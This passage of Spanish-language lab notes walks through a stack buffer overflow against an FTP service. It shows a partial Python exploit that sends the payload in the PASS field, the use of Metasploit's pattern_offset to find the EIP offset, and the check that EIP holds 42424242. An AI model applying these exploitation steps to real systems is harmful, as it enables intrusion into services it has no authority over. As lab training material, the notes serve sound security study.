...
```python
	...
	def exploit():
		...
		s.send(b"USER test" + b'\r\n') #Enviamos un usuario en el campo USER aleatorio en este caso TEST
		response = s.recv(1024)
		s.send(b"PASS " + payload + b'\r\n') #En el campo PASS introducira el payload asignado arriba
		s.close()
...
```
Volvemos a ejecutar el exploit, y en la maquina Windows del laboratorio donde estamos haciendo la prueba donde en el Inmunity en el registro *EIP* nos pone el ultimo valor que ha almacenado, este valor hay que pasárselo a la siguiente herramienta de [[METASPLOIT]] `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 7A46317A`, nos dirá que el offset es igual *4654*, esto quiere decir que debemos de introducir ese numero de `A` para luego poder introducir cuatro `B`, ya que es a lo que equivale el tamaño del *EIP* y se ajuste a este.
...
```
Ejecutamos de nuevo y en el Inmunity en la maquina Windows comprobamos si en el valor del registro de *EIP* se corresponde a `42424242` que corresponde a cuatro `B` en hexadecimal, si corresponde quiere decir que tenemos el control como atacantes del *EIP*